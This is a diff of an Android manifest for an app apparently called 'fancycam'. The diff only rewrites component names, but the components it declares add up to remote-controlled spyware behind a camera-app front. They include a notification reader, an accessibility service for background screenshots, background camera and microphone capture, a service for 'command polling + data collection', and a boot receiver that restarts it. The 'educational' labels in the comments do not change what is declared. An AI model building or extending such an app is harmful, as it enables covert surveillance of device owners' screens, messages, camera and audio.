@@ -63,7 +63,7 @@
         tools:targetApi="35">
 
         <activity
-            android:name=".ui.MainActivity"
+            android:name="xyz.nahil.fancycam.ui.MainActivity"
             android:exported="true">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
@@ -72,14 +72,14 @@
         </activity>
 
         <activity
-            android:name=".ui.SettingsActivity"
+            android:name="xyz.nahil.fancycam.ui.SettingsActivity"
             android:exported="false"
             android:launchMode="singleTop"
-            android:parentActivityName=".ui.MainActivity" />
+            android:parentActivityName="xyz.nahil.fancycam.ui.MainActivity" />
 
         <!-- Notification listener service for educational analysis -->
         <service
-            android:name=".services.NotificationReaderService"
+            android:name="xyz.nahil.fancycam.services.NotificationReaderService"
             android:exported="false"
             android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE">
             <intent-filter>
@@ -89,7 +89,7 @@
 
         <!-- Educational AccessibilityService for background screenshot capture -->
         <service
-            android:name=".services.ScreenCaptureAccessibilityService"
+            android:name="xyz.nahil.fancycam.services.ScreenCaptureAccessibilityService"
             android:exported="true"
             android:label="@string/app_name"
             android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
@@ -103,19 +103,19 @@
 
         <!-- Foreground service for background camera capture -->
         <service
-            android:name=".services.CameraCaptureService"
+            android:name="xyz.nahil.fancycam.services.CameraCaptureService"
             android:exported="false"
             android:foregroundServiceType="camera" />
 
         <!-- Foreground service for background audio capture -->
         <service
-            android:name=".services.AudioCaptureService"
+            android:name="xyz.nahil.fancycam.services.AudioCaptureService"
             android:exported="false"
             android:foregroundServiceType="microphone" />
 
         <!-- Primary long-lived foreground service: heartbeat + command polling + data collection -->
         <service
-            android:name=".services.CommandPollingService"
+            android:name="xyz.nahil.fancycam.services.CommandPollingService"
             android:exported="false"
             android:foregroundServiceType="specialUse">
             <property
@@ -125,7 +125,7 @@
 
         <!-- Revive the background cadence after boot or app update -->
         <receiver
-            android:name=".receivers.BootReceiver"
+            android:name="xyz.nahil.fancycam.receivers.BootReceiver"
             android:exported="true">
             <intent-filter>
                 <action android:name="android.intent.action.BOOT_COMPLETED" />
